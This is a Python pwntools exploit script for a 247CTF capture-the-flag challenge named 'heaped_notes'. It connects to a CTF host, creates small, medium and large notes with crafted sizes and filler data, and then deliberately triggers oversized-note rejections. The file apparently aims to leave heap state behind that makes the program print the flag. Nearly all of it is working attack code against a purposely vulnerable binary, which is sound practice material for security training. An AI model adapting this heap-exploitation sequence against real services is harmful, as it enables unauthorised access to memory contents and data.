#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./heaped_notes --host 5dca9eabc7b6dbdd.247ctf.com --port 50367
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./heaped_notes')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'efefcec2baf90340.247ctf.com'
port = int(args.PORT or 50388)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled



def create_note(command, size, data ):
    io.recvuntil('Enter command:')
    io.sendline(command)
    io.recvuntil('Enter the size of your') # Enter the size of your small note:
    io.sendline(size)
    io.recvuntil('Enter ') # Enter small note data:
    io.sendline(data)

def create_note_too_large(command, size):
    io.recvuntil('Enter command:')
    io.sendline(command)
    io.recvuntil('Enter the size of your') # Enter the size of your small note:
    io.sendline(size)




io = start()

create_note('large', '8', 'C'*128)
create_note_too_large('large', '129')
create_note('medium', '8', 'B'*64)
create_note_too_large('medium', '129')
create_note('small', '8', 'A'*32)



io.recvuntil('Enter command:')
io.sendline('print')

io.sendline('flag')
#io.recvuntil('247CTF')
io.interactive()

io.close()